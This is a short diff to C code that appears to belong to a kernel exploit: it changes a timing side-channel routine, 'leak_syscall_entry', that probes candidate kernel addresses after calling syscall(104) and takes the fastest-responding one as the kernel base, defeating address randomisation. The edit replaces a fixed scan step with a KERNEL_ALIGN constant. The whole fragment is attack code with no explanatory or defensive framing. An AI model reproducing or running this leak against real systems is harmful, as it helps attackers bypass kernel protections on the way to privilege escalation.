@@ -310,8 +310,7 @@ uint64_t sidechannel(uint64_t addr) {
   return c - a;
 }
 
-#define STEP 0x100000ull
-#define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP
+#define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / KERNEL_ALIGN
 
 uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t data[ARR_SIZE] = {0};
@@ -324,7 +323,7 @@ uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t idx;
   for (i = 0; i < iterations + dummy_iterations; i++) {
     for (idx = 0; idx < ARR_SIZE; idx++) {
-      uint64_t test = SCAN_START + idx * STEP;
+      uint64_t test = SCAN_START + idx * KERNEL_ALIGN;
       syscall(104);
       uint64_t time = sidechannel(test);
       if (i >= dummy_iterations)
@@ -336,9 +335,9 @@ uint64_t leak_syscall_entry(uint64_t offset) {
     data[i] /= iterations;
     if (data[i] < min) {
       min = data[i];
-      addr = SCAN_START + i * STEP;
+      addr = SCAN_START + i * KERNEL_ALIGN;
     }
-    // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
+    // printf("%llx %ld\n", (SCAN_START + i * KERNEL_ALIGN), data[i]);
   }
 
   if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
